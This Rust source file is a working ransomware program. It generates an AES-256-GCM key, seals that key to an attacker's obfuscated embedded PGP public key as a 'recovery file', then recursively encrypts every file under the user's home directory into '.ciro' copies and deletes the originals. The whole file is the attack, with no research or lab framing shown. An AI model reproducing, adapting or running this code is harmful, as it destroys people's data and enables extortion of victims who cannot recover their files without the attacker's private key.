use aes_gcm::{
    Aes256Gcm, KeyInit, aead::{AeadCore, OsRng, generic_array::GenericArray, stream::EncryptorBE32}
};
use dirs2::{data_dir, home_dir};
use pgp::{
    composed::{Deserializable, MessageBuilder, SignedPublicKey},
    crypto::sym::SymmetricKeyAlgorithm,
};
use rayon::prelude::*;
use std::{
    fs::{File, read_dir, remove_file},
    io::{BufReader, Read, Write},
    path::PathBuf,
};
use zeroize::Zeroize;
use flate2::read::GzDecoder;
use base64::{Engine as _, engine::general_purpose};

const PUB_KEY_ENCODED: &str = r#"H4sIAAAAAAAAA32ST4+iQBDF7/0pvBMDKCoe5tDdtNAgCChgc4PWaRH8P4jw6YdxL5vd7FZSSeVVUqn3yxsO+0LEpN7AN/2BH6ElxQOHsAFarrDzsx0CcDJcknmhYSFmOw1DCFpZ2OgIBjvo6hK/u/rM2vM2Tgq5lDJJiavyqn2S85WU5eglgMOLLuhaZUnSa25WDTd1EZwW535+5qdS+OaPPi9YsntkybzO1lrjlajhp7mSj7Qa5EkkFTYj5MUcaGgJDYKbLh35J+NT+aaO7LVRrpOvpHiJ7hxE+P0tpDlsIhtlqwwIGC1xICwoWIxFSXFDyUJQAwZ03/dWQOjg8LcjuYuhr9VCPvq3dKYDtXD512aNGFrMR5vdqbvcTexUT0ml51QondsQOJFni4ksSewW1fQSp7m6j57Vvar5RAFY9TbKBnWuWngKTLQVDC8qcTkRlzsShMB0F8MgekPVJx1tqcNqqt7Ddn7parUEwe7A8bS6tXgV8YQ/CreGDMPegrAKSyMm6tlg9k824E84BvwF5y/v2TTvvbf1qbo7K3n7UA/j7dLUQSSiw1hRwoks0iqNrCr0ckXz2is0JG/8nDt8pdVxVzuezY8ty5t2bG1nz1c4my5Uv1WAvQ0dEZQf4MMrrxy840U84z/Z+wZTTypjoQIAAA=="#;

fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> {
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let nonce_stream = GenericArray::from_slice(&nonce[0..8]); // Stream encryptor needs an 8-byte long nonce
    let mut encryptor = EncryptorBE32::from_aead(cipher, nonce_stream);

    let file = File::open(&path)?;
    // Using a bufreader to avoid loading the entire file in memory
    let mut reader = BufReader::new(file);
    let mut buffer = vec![0; 4096];

    let mut new_path = path.clone();
    if let Some(ext) = new_path.extension() {
        new_path.set_extension(format!("{}.ciro", ext.to_string_lossy()));
    } else {
        new_path.set_extension("ciro");
    }
    let mut new_file = File::create(new_path)?;
    new_file.write_all(nonce_stream)?;

    loop {
        let bytes_read = reader.read(&mut buffer)?;
        if bytes_read == 0 {
            break;
        }

        let ciphertext = encryptor.encrypt_next(&buffer[0..bytes_read]).map_err(|_| std::io::Error::other("Encyption error"))?;

        new_file.write_all(&ciphertext)?;
    }

    let ciphertext_last = encryptor.encrypt_last(b"".as_ref()).map_err(|_| std::io::Error::other("Last encryption error"))?;
    new_file.write_all(&ciphertext_last)?;

    let _ = remove_file(path);

    Ok(())
}

fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm) {
    if let Ok(entries) = read_dir(dir) {
        entries.par_bridge().into_par_iter().for_each(|entry| {
            if let Ok(entry) = entry {
                let path = entry.path();
                if path.is_dir() {
                    encrypt_files(path, cipher.clone());
                }
                else if let Some(ext) = path.extension() && ext != "txt.key"{
                    if let Some(err) = encrypt_file(path, cipher.clone()).err() {
                        println!("Error: {err}");
                    }
                } else if let Err(e) = encrypt_file(path, cipher.clone()) {
                    println!("Error: {e}");
                }
            }
        });
    }

}


// Main function of the program
fn main() {
    let dir = home_dir().expect("Could not open home directory");

    // Generate a cipher to encrypt files with aes2356 algorithm
    let mut key = Aes256Gcm::generate_key(OsRng);
    let cipher = Aes256Gcm::new(&key);

    // Create a recovery file inside data dir with the cipher key and nonce
    let decoded_key = general_purpose::STANDARD.decode(PUB_KEY_ENCODED).expect("Could not decode public key");
    let decoded_key_str = String::from_utf8(decoded_key).expect("Could not convert decoded public key to string");
    let mut gz = GzDecoder::new(decoded_key_str.as_bytes());
    let mut unzipped_key = String::new();
    gz.read_to_string(&mut unzipped_key).expect("Could not unzip public key");
    
    let (public_key, _) =
        SignedPublicKey::from_string(&unzipped_key).expect("Could not read public key");

    let mut msg =
        MessageBuilder::from_bytes("", key.to_vec()).seipd_v1(OsRng, SymmetricKeyAlgorithm::AES256);

    msg.encrypt_to_key(OsRng, &public_key)
        .expect("recovery key encryption failure");

    let mut data_dir = data_dir().expect("Missing dara dir");
    data_dir.push("recovery_file");
    data_dir.set_extension("txt.key");
    let mut recovery_file = File::create(data_dir).expect("Failed to create recovery file");

    recovery_file
        .write_all(&msg.to_vec(OsRng).unwrap())
        .expect("recovery file written");

    encrypt_files(dir, cipher);

    // Zeroing the key in memory
    key.zeroize();
}
